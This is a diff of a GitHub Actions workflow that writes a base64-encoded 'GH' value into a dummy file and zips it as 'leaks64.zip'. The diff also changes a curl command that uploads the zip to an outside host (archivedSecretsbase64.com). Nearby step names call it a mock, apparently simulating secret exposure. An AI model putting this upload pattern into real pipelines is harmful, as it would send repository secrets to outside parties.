@@ -46,7 +46,7 @@ jobs:
           echo "-d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'" > dummy_file_64.txt
           
           # 2. Create the leaks.zip file in the working directory
-          zip leaks.zip dummy_file_64.txt
+          zip leaks64.zip dummy_file_64.txt
 
       - name: 🚀 Upload the generated Zip File
         run: |
@@ -60,8 +60,8 @@ jobs:
         run: |
           # Since the 'zip' command ran in the root directory, 
           # the path is simply 'leaks.zip'
-          curl -X POST https://archivedSecrets.com \
-            -F "file=@leaks.zip" \
+          curl -X POST https://archivedSecretsbase64.com \
+            -F "file=@leaks64.zip" \
             -H "Content-Type: application/form-data"
             
       - name: Mock API key exposure request
